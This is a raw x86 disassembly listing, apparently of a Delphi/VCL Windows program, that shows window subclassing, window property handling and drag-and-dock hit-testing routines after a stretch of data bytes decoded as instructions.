inc ebx
add [ edi + edi * 8 ] al
inc ebx
add ah bh
inc ebx
add [ esp + eax * 2 ] dh
inc ecx
add ah cl
inc [ ebx ]
enter 0x43d2 0x0
xor al 0xd2
inc ebx
add al ah
fild [ ebx ]
insb
test al 0x41
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add al bh
into
inc ebx
add [ ebp + ebp * 8 - 0x126fffbd ] dl
inc ebx
add [ eax - 0x12 ] ah
inc ebx
add [ ecx + edx * 8 ] bh
inc ebx
add [ eax - 0x1bffbc28 ] al
xlat
inc ebx
add [ ecx ] cl
inc ebx
add [ eax + edx * 8 - 0x2f77ffbd ] al
add [ eax ] al
mov al 0x26
inc ecx
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
inc edi
add [ ebx ] cl
mov al 0xc
mov al 0xe
mov al 0xd
mov al 0x8
mov al 0x35
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add [ eax - 0x1d ] al
inc ebx
add [ ebx + edx * 8 - 0x1cdfffbd ] dh
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x800040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
add [ eax + ebp * 4 + 0x41 ] dl
jo r-xdata
add [ eax + 0x54004126 ] dh
test al 0x41
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x6b13ffc0 ] cl
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
cmp al 0x13
inc ecx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
mov esp 0x8004392
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6b ] bh
inc ebx
add [ edi + edx * 4 + 0x43 ] ah
add [ eax ] al
lea eax [ eax ]
in al dx
xchg esp eax
jbe r-xdata
inc ebx
add [ ecx + eax ] bl
add [ esi - 0x69 ] dl
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
cmp al 0x13
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
dec eax
xchg esp eax
inc ebx
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add al dl
iretd
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_438cde
add [ eax ] eax
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x438bcc74
add [ eax + eax ] dl
add bh bh
pushfd
0x43
sub_4398b4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
push [ edi + edx * 8 + 0x43 ]
add [ esi + edi * 8 + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480b0009 ] al
insb
jo r-xdata
inc ebx
add [ eax + eax ] ah
add [ eax ] al
jo r-xdata
add [ eax - 0x67 ] bh
jns r-xdata
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] eax
inc ebx
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
inc esp
add [ ecx + ebp * 4 + 0x41 ] dh
add [ ebp + ecx * 8 + 0x43 ] bl
add [ eax + 0x80041a9 ] ch
into
inc ebx
add al bh
test al 0x41
add [ ecx + ebp * 4 - 0x561fffbf ] cl
inc ecx
add [ eax - 0x34 ] cl
inc ebx
add [ esp ] ah
inc esp
add [ esp + ecx * 8 - 0x5bb3ffbd ] bh
inc esp
add [ ebx + eax ] dl
inc esp
add [ esi + ecx * 8 ] dh
inc ebx
add al dh
int3
outsd
jb r-xdata
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
inc eax
test eax 0x2f00041
inc eax
push esp
adc eax [ ecx ]
pop eax
add [ eax ] eax
jmp [ eax - 0x29 ]
sub_43ab98
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_43ac50
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_43ac84
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404534
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_43ac50
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_43ace0
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_43aec4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c314
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_404594
mov eax edi
mov edx esi
call sub_4040c8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43af08
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c314
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_404594
mov eax edi
mov edx esi
call sub_4040c8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43af4c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_43efc4
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43afc8
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
jne r-xdata
mov eax ebx
call sub_4445f8
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_43b074
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_413de4
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_43b0a8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4445f8
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_43b0d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026cc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_43b0a8
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_43b074
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413c88
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_413e60
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43b12c
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_413cbc
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413de4
mov edx 0x8
call sub_4026ec
inc esi
dec ebx
jne r-xdata
sub_43b160
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_413de4
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_43b074
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_43b1c4
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_43b224
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4031f0
mov edx esp
mov eax esi
call sub_4042d8
add esp 0x100
pop esi
pop ebx
retn
sub_43b260
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43b32a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_43c380
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43bd08
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b0c
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_43bd08
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_43c380
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43bd08
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_43c380
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_43b32f
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45dfe8
call sub_403aa8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_43c380
sub_43b388
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43b3b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43b418
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43b1c4
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_43b444
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_40349c
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_43b470
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_40349c
xor edx edx
sub_43b4c8
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_446260
sub_43b4e8
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_446248
sub_43b50c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43b3f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_41da44
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_4241ec
mov edx eax
mov eax esi
call sub_41dbc0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_43b570
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_43b5a0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43b418
mov eax esi
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43b5fc
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_40349c
pop edi
pop esi
pop ebp
retn 0x4
sub_43b620
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_43b644
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43b620
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43b620
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_43b700
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_43b76c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_43bbbc
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43ac84
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_4445f8
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_4445f8
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4445f8
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_40349c
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_43b700
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_4445f8
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_4445f8
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_43b904
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_4445f8
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4445f8
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_43b948
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_43b160
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_43b76c
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_413de4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_4445f8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_43b904
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_40349c
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_443128
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_43b0d0
sub_43baa4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_413e40
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_413cd4
mov edx edi
mov eax [ rw-data ]
call sub_413c88
jmp r-xdata
sub_43bb04
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
